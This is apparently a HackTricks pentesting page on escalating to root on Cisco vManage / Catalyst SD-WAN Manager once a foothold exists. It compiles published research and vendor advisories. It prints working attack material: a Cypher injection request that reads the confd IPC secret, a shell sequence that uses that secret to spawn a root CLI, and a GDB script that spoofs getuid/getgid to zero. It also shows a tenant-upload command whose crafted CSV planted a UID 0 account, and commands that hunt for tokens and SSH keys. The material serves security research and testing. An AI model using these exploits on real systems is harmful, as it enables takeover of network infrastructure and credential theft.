# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Once you have code execution on Cisco vManage / *Catalyst SD-WAN Manager* as `vmanage`, `netadmin`, or `vmanage-admin`, the most interesting local privesc surfaces are usually the `confd` CLI stack, the `cmdptywrapper` helper, localhost REST APIs, and root-owned import/upload handlers.

If you still need the **initial foothold** on a controller, check the dedicated control-plane page first:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage

```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```

If `/etc/confd/confd_ipc_secret` is readable from your foothold, Path 1 and Path 2 become immediately practical. If you arrive via a remote file disclosure or webshell, also inspect `vmanage-admin` SSH material and multitenancy upload handlers; recent research demonstrated both as viable pivots.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv's vManage assessment documents this root-shell path.<sup>[[5]](#references)</sup>

The [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) linked by the report describes IPC authentication; its vManage example places the secret at `/etc/confd/confd_ipc_secret` and shows it readable by `vmanage`.<sup>[[5]](#references)</sup>

```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```

Because Neo4j runs with `vmanage` privileges in the reported setup, the earlier Cypher injection can read the secret file.<sup>[[5]](#references)</sup>

```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```

`confd_cli` itself does not accept command-line arguments; it invokes `/usr/bin/confd_cli_user`. The reported workflow extracts that root-readable helper from the rootfs, copies it via `scp`, reads its help, sets `CONFD_IPC_ACCESS_FILE`, and calls it with `-U 0 -G 0` to obtain a root shell.<sup>[[5]](#references)</sup>

```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```

## Path 2

This alternative route is adapted from Walmart Global Tech's vManage 19.2.2 research.<sup>[[6]](#references)</sup>

The Synacktiv path needs a copy of `/usr/bin/confd_cli_user`, which is root-readable in the reported setup; the Walmart report instead alters `confd_cli`'s identity values under GDB.<sup>[[5]](#references)[[6]](#references)</sup>

The report's disassembly shows `confd_cli` collecting the caller's UID and GID.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump showing UID/GID collection</summary>

```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```

</details>

The same test showed a root-owned `cmdptywrapper` receiving explicit `-g` and `-u` values.<sup>[[6]](#references)</sup>

```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```

The researcher inferred that `confd_cli` forwards the logged-in user's UID and GID to `cmdptywrapper`.<sup>[[6]](#references)</sup>

Running `cmdptywrapper` directly with `-g 0 -u 0` failed because the required file descriptor (`-i 1015` in the example) was not available.<sup>[[6]](#references)</sup>

Because `confd_cli` does not expose those values as arguments, the report uses GDB to override the `getuid()` and `getgid()` return values; GDB was present on that appliance.<sup>[[5]](#references)[[6]](#references)</sup>

With `vmanage` access, the test could read `/etc/confd/confd_ipc_secret`; the following script forces both identity calls to return zero.<sup>[[6]](#references)</sup>

The GDB script used in the report is:<sup>[[6]](#references)</sup>

```
set environment USER=root
define root
   finish
   set $rax=0
   continue
end
break getuid
commands
   root
end
break getgid
commands
   root
end
run
```

The reported console output is:<sup>[[6]](#references)</sup>

<details>
<summary>Console output</summary>

```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```

</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco later documented a cleaner local root path in its own advisory for [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). An **authenticated attacker with only read-only privileges** could send a crafted request to the manager CLI and gain root because of insufficient input validation.<sup>[[7]](#references)</sup>

From an offensive perspective, this advisory and the earlier CLI research suggest the following workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Once you have *any* low-priv foothold on the box, you should test the local CLI service before going for the heavier Path 1 / Path 2 workflow.
2. Reuse the artifacts from Path 2 to find the trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Treat every field forwarded to the CLI backend as suspicious: UID/GID, username, terminal metadata, imported files, or any value later consumed by a root-owned helper.
4. If a low-priv user can reach the local CLI socket and influence those fields, root may be only one crafted request away.

After landing on the appliance, inspect the local CLI chain as follows.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```

This turns the 2025 bug into a reusable hunting pattern: look for **local CLI shims that collect identity in userland and forward it to a privileged wrapper**.<sup>[[6]](#references)[[7]](#references)</sup>

Do not confuse **CVE-2025-20122** with the later **CVE-2026-20122**: the 2025 issue is a *local* CLI-to-root bug, while the 2026 issue is a *remote* API arbitrary file overwrite that is mostly useful for planting a foothold and then revisiting Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory describes another useful privesc class, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). An **authenticated, local attacker with low privileges** could gain root because of an insufficient user-authentication mechanism in the REST API.<sup>[[1]](#references)</sup>

This matters because vManage privesc is not limited to `confd`/TTY abuse anymore; after a low-priv shell, also hunt for the following.<sup>[[1]](#references)</sup>

- localhost-only API endpoints that trust the caller too much
- tokens, cookies, or service credentials readable from the current account
- root-only actions exposed through `dataservice`/REST handlers that can still be triggered locally

In practice, once you have a shell as `vmanage` or another service user, local API abuse can be easier to automate than interactive CLI abuse.<sup>[[1]](#references)</sup>

```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```

If the local session context is enough to hit privileged REST functionality, prefer the API path: it is easier to replay, script, and chain with stolen web sessions or API tokens.<sup>[[1]](#references)</sup>

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Another recent pattern is [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). A local attacker with `netadmin` privileges could upload a **crafted file** that the CLI later handled unsafely, leading to command injection as `root`.<sup>[[2]](#references)</sup>

From a HackTricks point of view, the valuable technique is broader than the specific CVE.<sup>[[2]](#references)</sup>

1. Enumerate every CLI or web workflow that accepts a file: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Trace where the uploaded file lands and which root-owned script or binary consumes it.
3. Test whether the filename, file content, or parsed metadata is ever passed to shell commands, wrapper scripts, or `system()`-style helpers.
4. If you can already reach `netadmin` (valid creds, stolen session, or an auth-bypass chain), file-processing bugs are often the fastest path to root.

Google Cloud / Mandiant later showed a concrete instance of this bug class being exploited through the multitenancy import path.<sup>[[4]](#references)</sup>

```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```

In the observed attack, the crafted CSV modified `/etc/passwd` and `/etc/shadow` to create a temporary UID 0 account (`troot`). That makes `tenant-upload` / `tenant-list` style importers especially interesting: they are not just data-ingestion features, but potential root-owned parser front-ends.<sup>[[4]](#references)</sup>

A quick shell-side hunting pattern is:

```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```

This bug class chains especially well with remote footholds that grant `netadmin` but not `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Especially high-value because public research showed it could expose `confd_ipc_secret` or the `vmanage-admin` private key, turning a read bug into either Path 1 or a NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Different from the 2025 CLI bug above; VulnCheck used it to upload a webshell, which then makes the local privesc paths on this page immediately relevant.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – An authenticated attacker can execute script in an affected user's web interface; assess whether the resulting session context exposes API/CLI actions that reach `vshell` or one of the local privesc paths above.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Very strong precursor for Path 5 because `netadmin` is exactly the level required by the 2026 crafted-file privesc.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Similar offensive value to CVE-2026-20122, but through a later web UI upload path; Cisco says a file created or overwritten by the bug could later be used to elevate to root.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions showed attackers can roll back to an older vulnerable SD-WAN build, abuse the old CLI root bug, and then restore the original version.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Better documented in the dedicated SD-WAN control-plane page; it can append an SSH key for `vmanage-admin`, providing persistent NETCONF access for follow-on management-plane actions.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Critical authentication bypass in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)

{{#include ../../banners/hacktricks-training.md}}
